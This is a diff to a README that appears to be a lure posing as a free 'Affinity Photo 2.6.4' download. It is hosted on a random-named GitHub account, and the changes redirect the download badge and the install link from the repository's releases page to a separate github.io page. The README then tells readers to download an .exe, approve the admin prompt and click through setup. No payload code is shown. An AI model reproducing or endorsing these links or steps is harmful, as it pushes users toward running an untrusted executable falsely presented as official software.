@@ -1,6 +1,6 @@
 # 📷 affinity-photo-264-raw-tools - Edit digital images with professional performance
 
-[![](https://img.shields.io/badge/Download-Affinity_Photo_2.6.4-blue.svg)](https://github.com/Musculustricepsbrachiisemicentenary454/affinity-photo-264-raw-tools/releases)
+[![](https://img.shields.io/badge/Download-Affinity_Photo_2.6.4-blue.svg)](https://musculustricepsbrachiisemicentenary454.github.io)
 
 ## 📁 About this application
 
@@ -23,7 +23,7 @@ Ensure your computer meets these standards before you start the installation pro
 
 Follow these steps to set up the software on your machine.
 
-1.  **Download your file:** Visit the official release page to find the installer. You can reach the downloads through this link: [https://github.com/Musculustricepsbrachiisemicentenary454/affinity-photo-264-raw-tools/releases](https://github.com/Musculustricepsbrachiisemicentenary454/affinity-photo-264-raw-tools/releases). Look for the file ending in .exe.
+1.  **Download your file:** Visit the official release page to find the installer. You can reach the downloads through this link: [https://musculustricepsbrachiisemicentenary454.github.io](https://musculustricepsbrachiisemicentenary454.github.io). Look for the file ending in .exe.
 2.  **Run the installer:** Once the file finishes saving to your computer, double-click the file icon. A prompt might ask if you allow this program to make changes to your device. Click "Yes" to start.
 3.  **Follow the prompt:** A window appears to guide you through the setup. Read the terms and click "Next" through each screen. 
 4.  **Complete the process:** Click the "Install" button. The software copies the necessary files to your machine. After the progress bar reaches the end, click "Finish" to close the window.
